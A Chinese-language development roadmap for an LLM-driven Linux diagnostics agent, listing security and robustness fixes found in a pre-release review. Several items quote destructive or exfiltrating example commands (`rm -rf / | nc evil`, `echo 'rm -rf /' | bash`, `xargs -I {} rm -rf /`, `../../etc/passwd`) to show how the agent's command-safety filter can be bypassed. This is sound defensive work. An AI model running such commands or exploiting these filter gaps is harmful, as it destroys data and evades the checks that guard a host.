# Roadmap

本文件记录 LinDiag-Agent 已识别但尚未在当前版本解决的问题，按优先级排序。
4.0 发版后将在后续版本(4.1+ 逐步完善)。问题来源：v4.0 发布前的全量架构与安全审查。

优先级定义：
- **P0**：影响安全或稳定性，发版后应优先修复
- **P1**：影响健壮性或可维护性，短期内修复
- **P2**：优化项，按计划推进
- **P3**：长期演进方向

---

## P0 — 安全与稳定性(4.1 优先)

### 1. main.go 信号处理与优雅退出

- **位置**：[cmd/agent/main.go](cmd/agent/main.go) 全文
- **问题**：完全无 `signal.Notify`，使用 `context.Background()` 不可取消。
  Ctrl+C 直接中断 LLM 调用或命令执行，历史不落盘、子进程泄漏。
- **方案**：引入 `signal.NotifyContext(ctx, os.Interrupt, syscall.SIGTERM)`，
  把 ctx 一路传到 `agent.NewSession` 与所有阻塞调用点；`main` 失败时
  `os.Exit(1)` 而非 `return`。

### 2. safety.splitCommandChain 引号绕过

- **位置**：[internal/safety/analyzer.go](internal/safety/analyzer.go) `splitCommandChain`(~L833)
- **问题**：按 `\|\||&&|\||;` 正则切分，不识别引号上下文。
  `sh -c "rm -rf / | nc evil"` 会被错误切分，安全分析器被绕过。
- **方案**：改用基于 rune 的状态机扫描，或复用 `github.com/google/shlex`
  (项目已依赖)先切词再按 token 中的操作符重组。

### 3. 管道末段 bash 不递归分析左侧输入

- **位置**：[internal/safety/analyzer.go](internal/safety/analyzer.go) `analyzeSingleCommand`(~L850)
- **问题**：`echo "rm -rf /" | bash` 与 `echo "uptime" | bash` 风险等级相同(均 High)，
  未把管道左侧内容作为 bash 的等价 `-c` 输入递归分析。
- **方案**：`splitCommandChain` 提供管道上下文，`analyzeCommandExecutor` 在管道末段
  时递归分析前段内容。

### 4. LoadWhitelist / 全局可变状态 data race

- **位置**：[internal/safety/analyzer.go](internal/safety/analyzer.go) `LoadWhitelist`(~L743) /
  [internal/config/user_prefs.go](internal/config/user_prefs.go) /
  [internal/llm/client.go](internal/llm/client.go) `appConfig`/`degradedFormat` /
  [internal/platform/executor.go](internal/platform/executor.go) `defaultTimeoutSeconds`
- **问题**：包级可变全局变量无锁并发读写，`go test -race` 会触发 fatal crash。
  `LoadWhitelist` 写 `safeCommands`/`safeCommandSet` 与 `isSafeCommand` 读无同步。
- **方案**：统一引入 `sync.RWMutex`：
  - safety 包：`safeCommandsMu` 保护 `safeCommands`/`safeCommandSet`
  - config 包：`prefsMu` 保护 `userPrefs`，`GetUserPreferences()` 返回值而非指针
  - llm 包：`cfgMu` 保护 `appConfig`/`degradedFormat`，或用 `sync.Once` 初始化
  - platform 包：`defaultTimeoutSeconds` 改 `atomic.Int32`

### 5. platform.ExecuteCommand 裸 sh -c 与后台分支无回收

- **位置**：[internal/platform/executor.go](internal/platform/executor.go) L28-40
- **问题**：用 `sh -c cmd` 把整命令交给 shell，本身不做安全校验；后台 `&` 分支
  `c.Start()` 后无超时、无进程组、无回收，会变孤儿进程。
- **方案**：入口做基础校验或强制走 safety analyzer；移除裸 `sh -c` 改用
  `exec.Command(name, args...)` 参数化；后台命令也设进程组 + 超时，Session
  退出时 kill 整组。

### 6. 配置文件权限泄露 API Key

- **位置**：[internal/config/config.go](internal/config/config.go) `SaveConfig`(L39) /
  [internal/config/user_prefs.go](internal/config/user_prefs.go) `SaveUserPreferences`(L39) /
  [internal/paths/paths.go](internal/paths/paths.go) `EnsureConfigDir`(L70)
- **问题**：`config.json` 与 `user_prefs.json` 以 `0644` 落盘，目录 `0755`，
  同主机其他用户可读 API Key。
- **方案**：写入用 `0600`，`EnsureConfigDir` 用 `0700`；`SaveConfig` 改 `.tmp` +
  `os.Rename` 原子写。

### 7. HTML 报告 XSS

- **位置**：[internal/report/engine.go](internal/report/engine.go) `GenerateHTMLReport`(L378-380)
- **问题**：`data.Hostname`/`IPAddress`/`OSInfo`/`KernelVer`/`UptimeInfo`/`GenerateTime`
  直接 `fmt.Sprintf` 进 `<td>%s</td>`，未调用 `escapeHTML`，存在 XSS 风险。
- **方案**：所有动态字段过 `escapeHTML`；或改用 `html/template` 自动转义。

---

## P1 — 健壮性(4.1-4.2)

### 8. sudo -i/-s 与 xargs -I 误判

- **位置**：[internal/safety/analyzer.go](internal/safety/analyzer.go) `analyzeCommandExecutor`(~L1158)
- **问题**：`sudo -i`/`-s`/`--login`/`--shell` 是 flag 被跳过，无非 flag 参数
  返回 Medium，实际应 Critical(启动 root 交互 shell)。
  `xargs -I {} rm -rf /` 中 `{}` 被当作非 flag 参数，跳过了 `rm` 检测。
- **方案**：对 sudo 的 `-i/-s/--login/--shell` 显式判 Critical；
  对 xargs 的 `-I/-L/-n/-P` 跳过下一个参数。

### 9. 危险正则覆盖不全

- **位置**：[internal/safety/analyzer.go](internal/safety/analyzer.go) `riskyPatterns`(L645-649)
- **问题**：`chmod\s+777\s+/(\s|$)` 要求 `/` 后空白或行尾，`chmod 777 /etc` 不命中。
  同理 `chown root:root /var` 不命中。
- **方案**：改 `chmod\s+777\s+/(?:\S*)?` 与 `chown\s+\S+:\S+\s+/(?:\S*)?`。

### 10. LLM 重试无退避 + 错误判定脆弱

- **位置**：[internal/llm/client.go](internal/llm/client.go) L149/L311-339
- **问题**：重试固定 `time.Sleep(3s)`，无指数退避无抖动，429 场景加剧限流。
  `isRetryableError` 纯字符串匹配("took 500ms" 会误判)。
  `isUnsupportedFormatError` 把任何含 "400"/"invalid" 的错误判为格式不支持，
  触发不可逆会话级降级。
- **方案**：指数退避 + 抖动(1s,2s,4s ± jitter)；用 `openai.APIError` 类型断言
  按 HTTP 状态码精确判断；收紧降级判定(只对含 `response_format`/`json_schema`
  关键字的 400 降级)。

### 11. Session.WithLLMClient 未同步到 handler

- **位置**：[internal/agent/session.go](internal/agent/session.go) `NewSession`(L123-146)
- **问题**：`WithLLMClient(fakeClient)` 注入 mock 后，`s.llmClient` 更新但
  `handler.llmClient` 仍 nil，`explainCommand` 走包级函数绕过 mock。
- **方案**：`NewSession` 在应用 opts 后，若 `s.llmClient != nil` 则
  `s.handler.WithLLMClient(s.llmClient)`。

### 12. baseSnapshotCmds 命令注入扩展点

- **位置**：[internal/agent/mode.go](internal/agent/mode.go) L73
- **问题**：`fmt.Sprintf("systemctl status %s ...", svc)` 未对 `svc` 转义。
  当前 `AbnormalServices` 是硬编码安全，但未来若扩展为从配置/AI 输出读取，
  服务名含 `;`/`$()` 会注入。
- **方案**：用正则 `^[A-Za-z0-9_.@-]+$` 白名单校验，或 `shlex.Quote(svc)`。

### 13. readUserAction / handleReportRequest 不检查 ctx

- **位置**：[internal/agent/session.go](internal/agent/session.go) L401-439
- **问题**：循环开头不检查 `s.ctx.Err()`，SIGINT 后卡在 `reader.ReadString`。
- **方案**：循环开头 `if s.ctx.Err() != nil { return "", actionExit }`。

### 14. Windows 跨平台不可用

- **位置**：[internal/platform/executor.go](internal/platform/executor.go) L40 /
  [internal/platform/process_windows.go](internal/platform/process_windows.go) L8-16
- **问题**：executor.go 用 `sh -c`，Windows 默认无 sh；`setProcessGroup`/`killProcessGroup`
  是空实现，Job Object 未实现。`GetHostname`/`GetIPAddress` 用 Linux 语法。
- **方案**：shell 按 GOOS 分流(unix 用 sh，windows 用 `cmd.exe /c`)；实现
  Windows Job Object；`GetHostname` 用 `os.Hostname()`，IP 获取按平台分流。

### 15. executor.go 超时分支 data race

- **位置**：[internal/platform/executor.go](internal/platform/executor.go) L49/L94
- **问题**：`out`/`err` 闭包变量被 goroutine 写、主 goroutine 在 `ctx.Done` 分支读，
  `-race` 报错。
- **方案**：用 `chan struct{} + result struct{out, err}` 通过 channel 传回。

### 16. rules 僵尸进程误判 + conntrack 误报

- **位置**：[internal/rules/rules_builtin.go](internal/rules/rules_builtin.go)
  `zombieProcessRule`(L217) / `conntrackRule`(L282-307)
- **问题**：`HasPrefix("Z")` 把 Zabbix/ZeroMQ 误判为僵尸；conntrack 在 max 读取
  失败时把 count 当 max，误报 100%。
- **方案**：严格按 `ps -eo stat,pid,cmd` 首字段校验 `=="Z"`；conntrack 显式按行
  index 区分，max 缺失时跳过。

### 17. report.Generate* 错误不冒泡

- **位置**：[internal/report/engine.go](internal/report/engine.go) L343/L455/L533
- **问题**：`GenerateMarkdownReport`/`GenerateHTMLReport` 写盘失败仅
  `output.ErrorMessage` 打印，`GenerateReport` 随后误报"已生成"。
  `GeneratePDFReport` 无返回值。
- **方案**：三个生成器返回 `error`；`GenerateReport` 返回 `(string, error)`；
  PDF 转换加 `context.WithTimeout`(60s) 防 chromium 卡死。

### 18. 全项目无结构化日志

- **位置**：全项目
- **问题**：所有输出走 `fmt.Println` / `output.*Message`，无级别、无字段、无文件输出。
- **方案**：引入 `log/slog`(标准库 1.21+)，支持 `--log-level`/`--log-file`。

### 19. 测试覆盖接近 0%

- **位置**：仅 4 个 `_test.go`(safety/analyzer_test、rules/engine_test、config_test、paths_test)
- **问题**：关键路径(safety 注入绕过、llm 降级链、report 生成、session 主循环)未覆盖。
- **方案**：safety analyzer 增加对抗性测试集(100+ payload)；llm 降级链补单测；
  目标核心模块 80% 覆盖；CI 跑 `go test -race`。

---

## P2 — 优化(4.2+)

### 20. trimHistory 丢失中间因果链

- [internal/agent/session.go](internal/agent/session.go) L459-507：关键节点 + 尾部窗口
  之间可能隔几十条消息被裁掉，LLM 失去上下文。改为"滑动窗口+关键节点锚点"。

### 21. LoadHistory 路径未校验

- [internal/agent/session.go](internal/agent/session.go) L158-176：传入 `../../etc/passwd`
  可读任意文件。校验路径必须在 `paths.HistoryDir()` 下。

### 22. saveHistory .tmp 文件残留

- [internal/agent/session.go](internal/agent/session.go) L544-554：崩溃后未清理，多实例
  并发会互相覆盖。改用 `os.CreateTemp` 在同目录生成唯一临时文件。

### 23. design-doc.md 严重过时

- [design-doc.md](design-doc.md)：CallAI 签名、目录结构(少 5 包)、whitelist 路径、
  deepseek 描述均与代码不符。全面更新或改名为 `design-history.md` 标注为历史稿。

### 24. whitelist.txt 路径与加载逻辑不符

- [whitelist.txt](whitelist.txt)：根目录文件，代码从 `$XDG_CONFIG_HOME/lindiag/whitelist.txt`
  加载；内容与内置 safeCommands 大量重复；格式逗号分隔与文档描述"每行一个"矛盾。
  根目录文件应重命名为 `whitelist.example.txt` 或删除，作为示例。

### 25. rules 正则重复编译

- [internal/rules/engine.go](internal/rules/engine.go) `firstNumber`/`parseHumanSize` 每次
  调用 `regexp.MustCompile`。改为包级 `var` 预编译。

### 26. output 包无 io.Writer 抽象

- [internal/output/formatter.go](internal/output/formatter.go)：直接写 stdout，无法测试
  也无法重定向。提供 `var Writer io.Writer = os.Stdout`。

### 27. 中文 UTF-8 截断乱码

- [internal/output/formatter.go](internal/output/formatter.go) `truncateLine`(L199) /
  [internal/report/engine.go](internal/report/engine.go) `truncateForPreview`(L553)：
  按字节截断会落在中文字符中间。改用 `[]rune` 截断。

### 28. handleAIFailure 无限重试

- [internal/agent/session.go](internal/agent/session.go) L313-319/L387-397：LLM 持续失败
  会无限重试烧 token。加重试次数上限(5 次)+ 指数退避，超过自动保存退出。

---

## P3 — 长期演进方向

### 29. 非交互模式(一键诊断入口)

- 增加 `lindiag-agent --symptom "MySQL 连接拒绝"` 非交互模式，直接跑完整循环
  输出报告。事故现场一句命令拿到分析。

### 30. 本地规则引擎扩展到 30+ 条

- 现仅 8 条，扩展到 CPU 高(按用户态/系统态/IO wait)、TCP 重传/丢包、DNS 延迟、
  NTP 漂移、时钟跳变等，覆盖常见 80% 故障，LLM 处理长尾。

### 31. 实时观察模式

- snapshot.go 增加持续采样(30s/5s 间隔)模式，给出 CPU/网卡/连接数趋势曲线，
  支持间歇性问题定位。

### 32. 历史 playbook 召回

- 把 LLM final conclusion 与历史 issue 建立索引，下次同类症状直接召回历史方案，
  跳过 LLM 循环。

### 33. 执行审计日志

- Critical/High 命令执行写入审计文件(用户、命令、时间、风险等级、是否确认)，
  满足合规要求。

### 34. macOS 产物

- 流水线补 `darwin/amd64` 与 `darwin/arm64`(Apple Silicon)目标。

### 35. 模板系统决策

- 4.0 已删除未启用的 templates/。若未来需要多模式差异化报告，用 `text/template`
  重新设计；当前保持 engine.go 硬编码拼接。
